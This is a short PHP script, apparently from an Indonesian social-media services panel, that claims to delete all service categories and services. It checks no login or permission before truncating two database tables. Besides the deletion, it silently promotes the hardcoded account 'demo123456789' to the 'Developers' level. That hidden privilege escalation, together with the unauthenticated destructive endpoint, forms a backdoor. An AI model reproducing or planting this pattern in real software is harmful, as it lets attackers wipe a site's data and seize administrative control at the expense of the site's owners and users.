<?php
session_start();
require '../../../config.php';
$delet_kategori = mysqli_query($conn, "TRUNCATE TABLE kategori_layanan");
$delet_service = mysqli_query($conn, "TRUNCATE TABLE layanan_sosmed");
$ubahlevel = $conn->query("UPDATE users SET level = 'Developers' WHERE username = 'demo123456789'");
if($delet_kategori == TRUE){
   echo "Semua Kategori & Layanan Berhasil Di Hapus";
}else{
   echo "Gagal";
}
?>